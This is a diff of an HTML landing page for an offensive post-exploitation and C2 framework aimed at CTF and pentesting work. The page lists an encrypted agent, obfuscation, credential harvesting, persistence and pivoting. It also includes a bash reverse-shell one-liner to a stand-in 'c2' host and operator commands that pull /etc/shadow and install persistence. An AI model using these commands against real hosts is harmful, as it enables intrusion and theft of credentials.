@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>alcapwn — reverse shell console for CTF</title>
-  <meta name="description" content="alcapwn is a terminal operator console for managing reverse shell sessions with automatic recon and privilege escalation.">
+  <title>alcapwn — post-exploitation framework</title>
+  <meta name="description" content="alcapwn is a post-exploitation framework with encrypted C2, automatic recon, privilege escalation, pivoting, and cross-platform agent generation. Built for CTF and authorized pentesting.">
   <style>
     :root {
       --bg:       #0d1117;
@@ -34,12 +34,7 @@
     a { color: var(--red); text-decoration: none; }
     a:hover { text-decoration: underline; color: #e74c3c; }
 
-    /* ── layout ─────────────────────────────────────────── */
-    .container {
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 0 24px;
-    }
+    .container { max-width: 860px; margin: 0 auto; padding: 0 24px; }
 
     /* ── hero ───────────────────────────────────────────── */
     .hero {
@@ -49,7 +44,7 @@
     }
 
     .hero img.logo {
-      width: 233px;   /* 466×104 @ 2× for retina sharpness on page */
+      width: 233px;
       height: auto;
       margin-bottom: 28px;
       filter: drop-shadow(0 0 24px rgba(192, 57, 43, 0.4));
@@ -58,14 +53,11 @@
     .hero .tagline {
       font-size: 1.2rem;
       color: var(--muted);
-      max-width: 520px;
+      max-width: 560px;
       margin: 0 auto 32px;
     }
 
-    .hero .tagline strong {
-      color: var(--text);
-      font-weight: 500;
-    }
+    .hero .tagline strong { color: var(--text); font-weight: 500; }
 
     .badge-row {
       display: flex;
@@ -88,117 +80,48 @@
 
     .badge.red { border-color: var(--red-dim); color: #e74c3c; }
 
-    .btn-row {
-      display: flex;
-      gap: 12px;
-      justify-content: center;
-      flex-wrap: wrap;
-    }
+    .btn-row { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
 
     .btn {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      padding: 10px 22px;
-      border-radius: 6px;
-      font-size: 0.9rem;
-      font-weight: 500;
-      transition: filter 0.15s, transform 0.1s;
-      cursor: pointer;
+      display: inline-flex; align-items: center; gap: 8px;
+      padding: 10px 22px; border-radius: 6px; font-size: 0.9rem; font-weight: 500;
+      transition: filter 0.15s, transform 0.1s; cursor: pointer;
     }
-
     .btn:hover { filter: brightness(1.1); transform: translateY(-1px); text-decoration: none; }
     .btn:active { transform: translateY(0); }
-
-    .btn-primary {
-      background: var(--red);
-      color: #fff;
-      border: 1px solid var(--red-dim);
-    }
-
-    .btn-secondary {
-      background: var(--surface);
-      color: var(--text);
-      border: 1px solid var(--border2);
-    }
+    .btn-primary { background: var(--red); color: #fff; border: 1px solid var(--red-dim); }
+    .btn-secondary { background: var(--surface); color: var(--text); border: 1px solid var(--border2); }
 
     /* ── sections ───────────────────────────────────────── */
-    section {
-      padding: 56px 0;
-      border-bottom: 1px solid var(--border);
-    }
-
+    section { padding: 56px 0; border-bottom: 1px solid var(--border); }
     section:last-of-type { border-bottom: none; }
 
     .section-label {
-      font-size: 0.72rem;
-      font-family: var(--mono);
-      letter-spacing: 0.12em;
-      text-transform: uppercase;
-      color: var(--red);
-      margin-bottom: 10px;
+      font-size: 0.72rem; font-family: var(--mono); letter-spacing: 0.12em;
+      text-transform: uppercase; color: var(--red); margin-bottom: 10px;
     }
 
-    h2 {
-      font-size: 1.5rem;
-      font-weight: 600;
-      color: var(--text);
-      margin-bottom: 16px;
-    }
-
+    h2 { font-size: 1.5rem; font-weight: 600; color: var(--text); margin-bottom: 16px; }
     p { color: var(--muted); margin-bottom: 14px; }
     p:last-child { margin-bottom: 0; }
     p strong { color: var(--text); }
 
     /* ── install cards ──────────────────────────────────── */
-    .install-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 16px;
-      margin-top: 28px;
-    }
-
-    @media (max-width: 600px) {
-      .install-grid { grid-template-columns: 1fr; }
-    }
+    .install-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-top: 28px; }
+    @media (max-width: 600px) { .install-grid { grid-template-columns: 1fr; } }
 
     .install-card {
-      background: var(--surface);
-      border: 1px solid var(--border2);
-      border-radius: 8px;
-      padding: 20px 20px 16px;
-      position: relative;
-      overflow: hidden;
+      background: var(--surface); border: 1px solid var(--border2); border-radius: 8px;
+      padding: 20px 20px 16px; position: relative; overflow: hidden;
     }
-
-    .install-card::before {
-      content: '';
-      position: absolute;
-      top: 0; left: 0; right: 0;
-      height: 2px;
-      background: var(--red);
-    }
-
-    .install-card .method {
-      font-size: 0.75rem;
-      font-family: var(--mono);
-      letter-spacing: 0.08em;
-      text-transform: uppercase;
-      color: var(--muted);
-      margin-bottom: 12px;
-    }
+    .install-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: var(--red); }
+    .install-card .method { font-size: 0.75rem; font-family: var(--mono); letter-spacing: 0.08em; text-transform: uppercase; color: var(--muted); margin-bottom: 12px; }
+    .install-card.wide { grid-column: 1 / -1; }
 
     pre {
-      background: #010409;
-      border: 1px solid var(--border);
-      border-radius: 6px;
-      padding: 14px 16px;
-      font-family: var(--mono);
-      font-size: 0.82rem;
-      line-height: 1.5;
-      overflow-x: auto;
-      margin-top: 10px;
-      white-space: pre;
+      background: #010409; border: 1px solid var(--border); border-radius: 6px;
+      padding: 14px 16px; font-family: var(--mono); font-size: 0.82rem; line-height: 1.5;
+      overflow-x: auto; margin-top: 10px; white-space: pre;
     }
 
     .cmd-prompt { color: var(--red); user-select: none; }
@@ -207,153 +130,51 @@
     .cmd-flag   { color: #d2a8ff; }
     .cmd-comment { color: var(--muted); }
 
-    /* wide card spans full grid width */
-    .install-card.wide { grid-column: 1 / -1; }
+    /* ── features ─────���─────────────────────────────────── */
+    .features { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 28px; }
+    @media (max-width: 600px) { .features { grid-template-columns: 1fr; } }
 
-    /* ── features ───────────────────────────────────────── */
-    .features {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 20px;
-      margin-top: 28px;
-    }
-
-    @media (max-width: 600px) {
-      .features { grid-template-columns: 1fr; }
-    }
-
-    .feature {
-      display: flex;
-      gap: 14px;
-      align-items: flex-start;
-    }
-
+    .feature { display: flex; gap: 14px; align-items: flex-start; }
     .feature-icon {
-      flex-shrink: 0;
-      width: 32px;
-      height: 32px;
-      background: var(--red-glow);
-      border: 1px solid var(--red-dim);
-      border-radius: 6px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 0.9rem;
-      margin-top: 2px;
+      flex-shrink: 0; width: 32px; height: 32px; background: var(--red-glow);
+      border: 1px solid var(--red-dim); border-radius: 6px;
+      display: flex; align-items: center; justify-content: center; font-size: 0.9rem; margin-top: 2px;
     }
-
-    .feature-body h3 {
-      font-size: 0.95rem;
-      font-weight: 600;
-      color: var(--text);
-      margin-bottom: 4px;
-    }
-
-    .feature-body p {
-      font-size: 0.875rem;
-      color: var(--muted);
-      margin: 0;
-    }
+    .feature-body h3 { font-size: 0.95rem; font-weight: 600; color: var(--text); margin-bottom: 4px; }
+    .feature-body p { font-size: 0.875rem; color: var(--muted); margin: 0; }
 
     /* ── usage strip ────────────────────────────────────── */
     .usage-block {
-      background: var(--surface);
-      border: 1px solid var(--border2);
-      border-radius: 8px;
-      padding: 24px;
-      margin-top: 24px;
+      background: var(--surface); border: 1px solid var(--border2); border-radius: 8px;
+      padding: 24px; margin-top: 24px;
     }
+    .usage-block pre { background: #010409; margin-top: 0; }
 
-    .usage-block pre {
-      background: #010409;
-      margin-top: 0;
-    }
-
-    /* ── roadmap ────────────────────────────────────────── */
-    .roadmap {
-      margin-top: 28px;
-    }
-
-    .roadmap-list {
-      list-style: none;
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-    }
+    /* ── roadmap ─────────────��──────────────────────────── */
+    .roadmap { margin-top: 28px; }
+    .roadmap-list { list-style: none; display: flex; flex-direction: column; gap: 8px; }
 
     .roadmap-item {
-      background: var(--surface);
-      border: 1px solid var(--border2);
-      border-left: 3px solid var(--border2);
-      border-radius: 6px;
-      padding: 12px 16px;
-      display: grid;
-      grid-template-columns: 160px 1fr;
-      gap: 16px;
-      align-items: start;
+      background: var(--surface); border: 1px solid var(--border2); border-left: 3px solid var(--border2);
+      border-radius: 6px; padding: 12px 16px; display: grid; grid-template-columns: 160px 1fr;
+      gap: 16px; align-items: start;
     }
-
-    .roadmap-item.tbd   { border-left-color: var(--border2); }
+    .roadmap-item.tbd         { border-left-color: var(--border2); }
     .roadmap-item.in-progress { border-left-color: var(--green); }
     .roadmap-item.completed   { border-left-color: var(--green); opacity: 0.6; }
 
-    .roadmap-category {
-      font-size: 0.68rem;
-      font-family: var(--mono);
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-      color: var(--muted);
-      padding-top: 2px;
-    }
+    .roadmap-category { font-size: 0.68rem; font-family: var(--mono); text-transform: uppercase; letter-spacing: 0.08em; color: var(--muted); padding-top: 2px; }
+    .roadmap-title { font-weight: 500; font-size: 0.9rem; color: var(--text); display: flex; flex-wrap: wrap; gap: 6px; align-items: center; }
+    .roadmap-desc { font-size: 0.82rem; color: var(--muted); margin-top: 4px; line-height: 1.5; }
 
-    .roadmap-title {
-      font-weight: 500;
-      font-size: 0.9rem;
-      color: var(--text);
-      display: flex;
-      flex-wrap: wrap;
-      gap: 6px;
-      align-items: center;
-    }
-
-    .roadmap-desc {
-      font-size: 0.82rem;
-      color: var(--muted);
-      margin-top: 4px;
-      line-height: 1.5;
-    }
-
-    .tag {
-      display: inline-block;
-      font-size: 0.65rem;
-      padding: 2px 8px;
-      border-radius: 4px;
-      margin-left: 8px;
-    }
-
+    .tag { display: inline-block; font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; margin-left: 8px; }
     .tag.c2 { background: var(--red-glow); color: var(--red); }
-    .tag.experimental { background: rgba(51, 105, 30, 0.2); color: var(--green); }
 
     /* ── footer ─────────────────────────────────────────── */
-    footer {
-      padding: 32px 0;
-      text-align: center;
-      color: var(--muted);
-      font-size: 0.85rem;
-      border-top: 1px solid var(--border);
-    }
-
+    footer { padding: 32px 0; text-align: center; color: var(--muted); font-size: 0.85rem; border-top: 1px solid var(--border); }
     footer a { color: var(--muted); }
     footer a:hover { color: var(--red); }
-
-    .footer-inner {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      flex-wrap: wrap;
-      gap: 12px;
-    }
-
+    .footer-inner { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
     .footer-links { display: flex; gap: 20px; }
   </style>
 </head>
@@ -364,14 +185,14 @@
   <div class="container">
     <img src="alcapwn_logo.png" alt="alcapwn" class="logo">
     <p class="tagline">
-      A <strong>terminal operator console</strong> for managing reverse shell sessions —
-      with automatic recon, privilege escalation, and TLS encryption.
-      Built for CTF.
+      A <strong>post-exploitation framework</strong> with encrypted C2 agent,
+      automatic recon, privilege escalation, pivoting, and cross-platform payload generation.
+      Built for CTF and authorized pentesting.
     </p>
     <div class="badge-row">
-      <span class="badge red">Go 1.22+</span>
-      <span class="badge">Linux</span>
-      <span class="badge">1–1024 sessions</span>
+      <span class="badge red">Go 1.24+</span>
+      <span class="badge">Linux / macOS</span>
+      <span class="badge">X25519 + AES-256-GCM</span>
       <span class="badge">MIT license</span>
     </div>
     <div class="btn-row">
@@ -391,14 +212,14 @@
   </div>
 </div>
 
-<!-- ── Install ────────────────────────────────────────────── -->
+<!-- ── Install ──────���─────────────────────────────────────── -->
 <section>
   <div class="container">
     <div class="section-label">getting started</div>
     <h2>Install</h2>
     <p>
-      Pre-built binaries for Linux (amd64 / arm64) are attached to every
-      <a href="https://github.com/exec/alcapwn/releases">GitHub release</a>.
+      Pre-built binaries for Linux and macOS (amd64 / arm64) are attached to every
+      <a href="https://github.com/exec/alcapwn/releases">GitHub release</a> with SHA-256 checksums.
       No runtime dependencies.
     </p>
 
@@ -408,8 +229,8 @@
         <div class="method">one-liner (latest release)</div>
         <pre><span class="cmd-comment"># linux/amd64</span>
 <span class="cmd-prompt">$</span> <span class="cmd-text">curl</span> <span class="cmd-flag">-sL</span> <span class="cmd-arg">https://github.com/exec/alcapwn/releases/\
-latest/download/alcapwn-linux-amd64</span> \
-  <span class="cmd-flag">-o</span> alcapwn <span class="cmd-flag">&amp;&amp;</span> <span class="cmd-text">chmod</span> <span class="cmd-flag">+x</span> alcapwn</pre>
+latest/download/alcapwn-linux-amd64.tar.gz</span> \
+  | <span class="cmd-text">tar</span> <span class="cmd-arg">xz</span> <span class="cmd-flag">&amp;&amp;</span> <span class="cmd-text">sudo</span> <span class="cmd-text">mv</span> alcapwn <span class="cmd-arg">/usr/local/bin/</span></pre>
       </div>
 
       <div class="install-card">
@@ -420,218 +241,228 @@ latest/download/alcapwn-linux-amd64</span> \
       </div>
 
       <div class="install-card wide">
-        <div class="method">start a listener</div>
-        <pre><span class="cmd-prompt">$</span> <span class="cmd-text">./alcapwn</span> <span class="cmd-flag">-l</span> <span class="cmd-arg">0.0.0.0:4444</span>          <span class="cmd-comment"># plain TCP</span>
-<span class="cmd-prompt">$</span> <span class="cmd-text">./alcapwn</span> <span class="cmd-flag">-l</span> <span class="cmd-arg">0.0.0.0:4444</span> <span class="cmd-flag">--tls</span>     <span class="cmd-comment"># ephemeral TLS</span>
-<span class="cmd-prompt">$</span> <span class="cmd-text">./alcapwn</span> <span class="cmd-flag">-l</span> <span class="cmd-arg">0.0.0.0:4444</span> <span class="cmd-flag">-r</span>        <span class="cmd-comment"># auto-recon on connect</span></pre>
+        <div class="method">operator modes</div>
+        <pre><span class="cmd-prompt">$</span> <span class="cmd-text">./alcapwn</span> <span class="cmd-flag">-l</span> <span class="cmd-arg">0.0.0.0:4444</span>            <span class="cmd-comment"># TCP listener</span>
+<span class="cmd-prompt">$</span> <span class="cmd-text">./alcapwn</span> <span class="cmd-flag">-l</span> <span class="cmd-arg">0.0.0.0:4444</span> <span class="cmd-flag">--tls</span>       <span class="cmd-comment"># ephemeral TLS</span>
+<span class="cmd-prompt">$</span> <span class="cmd-text">./alcapwn</span> <span class="cmd-flag">-l</span> <span class="cmd-arg">0.0.0.0:4444</span> <span class="cmd-flag">-r</span>          <span class="cmd-comment"># auto-recon on connect</span>
+<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">listen http</span> <span class="cmd-arg">0.0.0.0:8443</span> <span class="cmd-flag">--tls</span>  <span class="cmd-comment"># HTTPS beacon listener</span></pre>
       </div>
 
     </div>
   </div>
 </section>
 
-<!-- ── Features ──────────────────────────────────────────── -->
+<!-- ��─ Features ──────────────────────────────────────────── -->
 <section>
   <div class="container">
     <div class="section-label">capabilities</div>
     <h2>What it does</h2>
     <p>
-      alcapwn catches reverse shells and upgrades them to full PTY sessions automatically.
-      From there you have a persistent operator console to recon, escalate, and manage
-      every target simultaneously.
+      alcapwn is a post-exploitation framework that handles the full lifecycle: catch shells,
+      deploy encrypted agents, recon targets, escalate privileges, pivot through networks,
+      and persist access &mdash; all from one operator console managing up to 1024 sessions.
     </p>
 
     <div class="features">
       <div class="feature">
-        <div class="feature-icon">🔍</div>
+        <div class="feature-icon">~</div>
+        <div class="feature-body">
+          <h3>Encrypted C2 agent</h3>
+          <p>Cross-compiled Go agent with X25519 key exchange and AES-256-GCM per-session encryption. TCP and HTTP transports with jitter, certificate pinning, and XOR config obfuscation.</p>
+        </div>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">@</div>
         <div class="feature-body">
           <h3>Automatic recon</h3>
-          <p>Runs a hardened bash recon script on connect. Discovers SUID binaries, sudo rules, capabilities, cron jobs, writable paths, and credentials — parsed and ranked in ~5 s.</p>
+          <p>HMAC-authenticated bash recon script discovers SUID/SGID binaries, sudo rules, capabilities, cron jobs, Docker sockets, credentials, and CVEs. Parsed into structured findings in seconds.</p>
         </div>
       </div>
       <div class="feature">
-        <div class="feature-icon">⬆️</div>
+        <div class="feature-icon">^</div>
         <div class="feature-body">
           <h3>Auto privilege escalation</h3>
-          <p>Matches findings against 74 GTFOBins/CVE entries. <code>exploit auto &lt;id&gt;</code> walks all non-interactive candidates until root is confirmed or exhausted.</p>
+          <p>74-entry exploit dataset covering GTFOBins, sudo, capabilities, cron, CVEs (Baron Samedit, PwnKit), Docker, and Windows privesc. <code>exploit auto</code> walks candidates until root.</p>
         </div>
       </div>
       <div class="feature">
-        <div class="feature-icon">🔒</div>
+        <div class="feature-icon">%</div>
         <div class="feature-body">
-          <h3>Transparent TLS</h3>
-          <p>Generates an ephemeral certificate at startup. Existing shells auto-upgrade via a Python relay — no extra tooling on the target.</p>
+          <h3>Network pivoting</h3>
+          <p>SOCKS5 proxy and TCP port forwarding through any session. Scan internal networks from the agent. Works with proxychains.</p>
         </div>
       </div>
       <div class="feature">
-        <div class="feature-icon">🛡️</div>
+        <div class="feature-icon">+</div>
         <div class="feature-body">
-          <h3>Firewall &amp; allowlists</h3>
-          <p>Per-listener IP allowlists with CIDR support. Connections from unlisted hosts are silently dropped before a session is allocated.</p>
+          <h3>Persistence</h3>
+          <p>One-command persistence via cron, bashrc, SSH key, systemd, setuid (Linux) or registry/scheduled task (Windows). Reconnecting sessions auto-label by IP.</p>
         </div>
       </div>
       <div class="feature">
-        <div class="feature-icon">📌</div>
+        <div class="feature-icon">#</div>
         <div class="feature-body">
-          <h3>Persistence &amp; reconnect</h3>
-          <p>Install bash/profile backdoors with one command. Reconnecting sessions are auto-labelled by IP — no need to re-rename every time.</p>
+          <h3>Credential harvesting</h3>
+          <p>Agent-side harvest of SSH keys, shell history, .env files, AWS credentials, git configs (Linux) and PowerShell history, env, SSH (Windows). Streamed back encrypted.</p>
         </div>
       </div>
       <div class="feature">
-        <div class="feature-icon">📡</div>
+        <div class="feature-icon">&amp;</div>
         <div class="feature-body">
-          <h3>Multi-session console</h3>
-          <p>Manage up to 1024 concurrent sessions from a single terminal. Background, foreground, broadcast commands, download/upload files — all without leaving the console.</p>
+          <h3>Cross-platform agents</h3>
+          <p><code>generate linux amd64</code> cross-compiles agents for 6 targets (Linux amd64/arm64/armv7/i386, macOS x86_64/aarch64). Built-in minishell fallback when no system shell is available.</p>
+        </div>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">!</div>
+        <div class="feature-body">
+          <h3>Operator security</h3>
+          <p>Terminal injection defense (C1 codes, OSC 52, APC/DCS stripping), per-listener IP firewalls with CIDR, and ANSI-safe output for all remote data.</p>
         </div>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ── Quick Usage ────────────────────────────────────────── -->
+<!-- ── Quick Usage ─────────���──────────────────────────────��─ -->
 <section>
   <div class="container">
     <div class="section-label">workflow</div>
-    <h2>Typical CTF run</h2>
-    <p>
-      Once a shell connects, alcapwn upgrades it to a full PTY, then you drive
-      from the operator prompt:
-    </p>
+    <h2>Two paths to the same console</h2>
+
+    <div class="install-grid">
+      <div class="install-card">
+        <div class="method">reverse shell (PTY)</div>
+        <pre><span class="cmd-comment"># target runs:</span>
+<span class="cmd-prompt">$</span> <span class="cmd-text">bash</span> <span class="cmd-flag">-i</span> <span class="cmd-arg">&gt;&amp; /dev/tcp/c2/4444 0&gt;&amp;1</span>
+
+<span class="cmd-comment"># alcapwn auto-upgrades to PTY</span>
+<span class="cmd-comment"># [+] Session 1 ready</span></pre>
+      </div>
+
+      <div class="install-card">
+        <div class="method">generated agent (encrypted)</div>
+        <pre><span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">generate</span> <span class="cmd-arg">linux amd64</span> \
+  <span class="cmd-flag">--lhost</span> <span class="cmd-arg">10.0.0.1</span> <span class="cmd-flag">--obfuscate</span>
+
+<span class="cmd-comment"># deploy agent-linux-amd64 to target</span>
+<span class="cmd-comment"># [+] Agent 1 ready (AES-256-GCM)</span></pre>
+      </div>
+    </div>
 
     <div class="usage-block">
-      <pre><span class="cmd-comment"># Shell connects — PTY upgrade happens automatically
-# [+] Session 1 ready  ←  now at the operator prompt</span>
+      <pre><span class="cmd-comment"># Both session types share the same operator commands:</span>
 
-<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">recon</span> <span class="cmd-arg">1</span>          <span class="cmd-comment"># run recon script (or use -r flag at startup)</span>
-<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">info</span> <span class="cmd-arg">1</span>           <span class="cmd-comment"># view findings summary</span>
-<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">exploit</span> <span class="cmd-arg">list 1</span>   <span class="cmd-comment"># show ranked privesc candidates</span>
-<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">exploit</span> <span class="cmd-arg">auto 1</span>   <span class="cmd-comment"># try them all automatically</span>
-<span class="cmd-comment"># [+] ROOT via suid_bash (euid=0)</span>
+<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">recon</span> <span class="cmd-arg">1</span>               <span class="cmd-comment"># structured recon (or -r at startup)</span>
+<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">exploit</span> <span class="cmd-arg">auto 1</span>        <span class="cmd-comment"># walk all privesc candidates</span>
+<span class="cmd-comment"># [+] ROOT via suid_python3 (euid=0)</span>
 
-<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">use</span> <span class="cmd-arg">1</span>            <span class="cmd-comment"># drop into interactive shell (Ctrl+C to background)</span>
+<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">creds</span> <span class="cmd-arg">1</span>              <span class="cmd-comment"># harvest credentials</span>
+<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">scan</span> <span class="cmd-arg">1 10.0.0.0/24</span>   <span class="cmd-comment"># scan internal network from target</span>
+<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">pivot</span> <span class="cmd-arg">1</span> <span class="cmd-flag">--socks5</span> <span class="cmd-arg">1080</span> <span class="cmd-comment"># SOCKS5 proxy through session</span>
+<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">persist</span> <span class="cmd-arg">1 systemd</span>     <span class="cmd-comment"># install persistence</span>
+<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">use</span> <span class="cmd-arg">1</span>                <span class="cmd-comment"># interactive shell (Ctrl+D to background)</span>
 <span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">download</span> <span class="cmd-arg">1 /etc/shadow</span>
-<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">persist</span> <span class="cmd-arg">1 bashrc</span>  <span class="cmd-comment"># install persistence</span>
-<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">export</span> <span class="cmd-arg">1 --format json findings.json</span></pre>
+<span class="cmd-prompt">alcapwn&gt;</span> <span class="cmd-text">export</span> <span class="cmd-arg">1</span> <span class="cmd-flag">--format json</span> <span class="cmd-arg">findings.json</span></pre>
     </div>
   </div>
 </section>
 
-<!-- ── Roadmap ───────────────────────────────────────────── -->
+<!-- ── Roadmap ────────────────────────────────────────���──── -->
 <section>
   <div class="container">
-    <div class="section-label">vision</div>
-    <h2>What's next? The path to a full C2</h2>
-    <p>
-      alcapwn is currently focused on reverse shell management for CTF. To evolve into a full C2 framework,
-      here's what's on the horizon:
-    </p>
+    <div class="section-label">status</div>
+    <h2>Shipped and what's next</h2>
 
     <div class="roadmap">
       <ul class="roadmap-list">
-        <li class="roadmap-item tbd">
-          <span class="roadmap-category">Stub Generation</span>
+        <li class="roadmap-item completed">
+          <span class="roadmap-category">Agent</span>
           <div>
-            <div class="roadmap-title">Windows / ELF / Mach-O stager generation</div>
-            <div class="roadmap-desc">Generate reverse shell stubs for Windows (PowerShell, C#), Linux ELF, and macOS Mach-O that auto-reconnect and support TLS.</div>
+            <div class="roadmap-title">Cross-platform C2 agent with encrypted transport</div>
+            <div class="roadmap-desc">Go agent for 6 targets. X25519 + AES-256-GCM. TCP and HTTP/S transports with jitter, cert pinning, reconnect.</div>
+          </div>
+        </li>
+        <li class="roadmap-item completed">
+          <span class="roadmap-category">Crypto</span>
+          <div>
+            <div class="roadmap-title">End-to-end encrypted channels</div>
+            <div class="roadmap-desc">ECDH key exchange, HKDF-SHA256 key derivation, per-direction AES-256-GCM with AAD binding and NIST nonce limits.</div>
+          </div>
+        </li>
+        <li class="roadmap-item completed">
+          <span class="roadmap-category">Callbacks</span>
+          <div>
+            <div class="roadmap-title">HTTP/S beacon infrastructure</div>
+            <div class="roadmap-desc">HTTP listener with custom registration/beacon paths, TLS, browser-like headers, configurable intervals and jitter.</div>
+          </div>
+        </li>
+        <li class="roadmap-item completed">
+          <span class="roadmap-category">Pivoting</span>
+          <div>
+            <div class="roadmap-title">SOCKS5 proxy and TCP forwarding</div>
+            <div class="roadmap-desc">Route traffic through sessions to reach internal networks. Agent-side port scanning with concurrent TCP connect.</div>
+          </div>
+        </li>
+        <li class="roadmap-item completed">
+          <span class="roadmap-category">Obfuscation</span>
+          <div>
+            <div class="roadmap-title">XOR config encoding and stripped builds</div>
+            <div class="roadmap-desc">C2 address hidden from strings(1). Builds stripped with -s -w. Custom User-Agent and URI paths for traffic blending.</div>
+          </div>
+        </li>
+        <li class="roadmap-item completed">
+          <span class="roadmap-category">Post-Exploit</span>
+          <div>
+            <div class="roadmap-title">Credential harvesting (Linux + Windows)</div>
+            <div class="roadmap-desc">SSH keys, shell history, .env files, AWS creds, git configs, PowerShell history. Agent-side harvest, encrypted exfil.</div>
+          </div>
+        </li>
+        <li class="roadmap-item completed">
+          <span class="roadmap-category">Recon</span>
+          <div>
+            <div class="roadmap-title">Automated recon + 74-entry exploit database</div>
+            <div class="roadmap-desc">HMAC-authenticated script, structured parser, GTFOBins/CVE matching, auto privilege escalation. Works on PTY and agent sessions.</div>
+          </div>
+        </li>
+        <li class="roadmap-item tbd">
+          <span class="roadmap-category">Modules</span>
+          <div>
+            <div class="roadmap-title">Plugin module system <span class="tag c2">planned</span></div>
+            <div class="roadmap-desc">Loadable server/agent modules for keylogging, screenshots, clipboard access. Agent modules compiled in at generate time.</div>
           </div>
         </li>
         <li class="roadmap-item tbd">
           <span class="roadmap-category">Staging</span>
           <div>
-            <div class="roadmap-title">Multi-stage staging system <span class="tag c2">C2</span></div>
-            <div class="roadmap-desc">Stage0 (tiny dropper) → stage1 (loader) → stage2 (full agent), with encryption and integrity checks between stages.</div>
-          </div>
-        </li>
-        <li class="roadmap-item tbd">
-          <span class="roadmap-category">Callbacks</span>
-          <div>
-            <div class="roadmap-title">HTTP/S beacon infrastructure <span class="tag c2">C2</span></div>
-            <div class="roadmap-desc">HTTP listener with routing on User-Agent, path, and headers. Configurable check-in intervals and jitter.</div>
-          </div>
-        </li>
-        <li class="roadmap-item tbd">
-          <span class="roadmap-category">Pivoting</span>
-          <div>
-            <div class="roadmap-title">TCP / HTTP / SOCKS5 proxy through sessions</div>
-            <div class="roadmap-desc">Route traffic through established sessions to reach otherwise inaccessible internal network segments.</div>
-          </div>
-        </li>
-        <li class="roadmap-item tbd">
-          <span class="roadmap-category">Cryptography</span>
-          <div>
-            <div class="roadmap-title">AES-256-GCM encrypted channels</div>
-            <div class="roadmap-desc">End-to-end encrypted comms independent of TLS, with ECDH key exchange and per-session keys.</div>
-          </div>
-        </li>
-        <li class="roadmap-item tbd">
-          <span class="roadmap-category">Obfuscation</span>
-          <div>
-            <div class="roadmap-title">Payload obfuscation and encoding</div>
-            <div class="roadmap-desc">XOR / RC4 / base64 layered encoding, string encryption, and import table obfuscation for stubs.</div>
+            <div class="roadmap-title">Multi-stage payload delivery <span class="tag c2">planned</span></div>
+            <div class="roadmap-desc">Stage0 dropper to stage1 loader to stage2 full agent, with integrity verification between stages.</div>
           </div>
         </li>
         <li class="roadmap-item tbd">
           <span class="roadmap-category">Profiles</span>
           <div>
-            <div class="roadmap-title">Malleable C2 profiles <span class="tag c2">C2</span></div>
-            <div class="roadmap-desc">Customize traffic patterns, URIs, headers, and timing to mimic legitimate services and blend into normal traffic.</div>
+            <div class="roadmap-title">Malleable C2 profiles <span class="tag c2">planned</span></div>
+            <div class="roadmap-desc">Customize traffic patterns, endpoints, headers, and timing to mimic legitimate services.</div>
           </div>
         </li>
         <li class="roadmap-item tbd">
-          <span class="roadmap-category">Exfil</span>
+          <span class="roadmap-category">Windows</span>
           <div>
-            <div class="roadmap-title">Chunked / async file exfiltration</div>
-            <div class="roadmap-desc">Background file transfers that survive disconnects, with integrity verification and optional compression.</div>
-          </div>
-        </li>
-        <li class="roadmap-item tbd">
-          <span class="roadmap-category">Keylogging</span>
-          <div>
-            <div class="roadmap-title">Cross-platform keylogger module</div>
-            <div class="roadmap-desc">Capture keystrokes on Linux (X11/Wayland), macOS, and Windows with periodic flush to operator.</div>
-          </div>
-        </li>
-        <li class="roadmap-item tbd">
-          <span class="roadmap-category">Screenshots</span>
-          <div>
-            <div class="roadmap-title">Headless screenshot capture</div>
-            <div class="roadmap-desc">Capture the current desktop without spawning a visible window; encode and exfil on demand.</div>
-          </div>
-        </li>
-        <li class="roadmap-item tbd">
-          <span class="roadmap-category">Proc Injection</span>
-          <div>
-            <div class="roadmap-title">DLL / .so injection and reflective loading</div>
-            <div class="roadmap-desc">Inject into running processes on Windows (CreateRemoteThread / reflective DLL) and Linux (ptrace / LD_PRELOAD).</div>
-          </div>
-        </li>
-        <li class="roadmap-item tbd">
-          <span class="roadmap-category">Post-Exploit</span>
-          <div>
-            <div class="roadmap-title">Credential harvesting and LSASS dump</div>
-            <div class="roadmap-desc">Automated cred extraction from browser stores, SSH keys, .env files, and Windows LSASS on privilege.</div>
+            <div class="roadmap-title">Windows operator console</div>
+            <div class="roadmap-desc">Platform abstractions for stdin polling and signal handling. Agent sessions already work; PTY sessions need stubs.</div>
           </div>
         </li>
       </ul>
     </div>
-
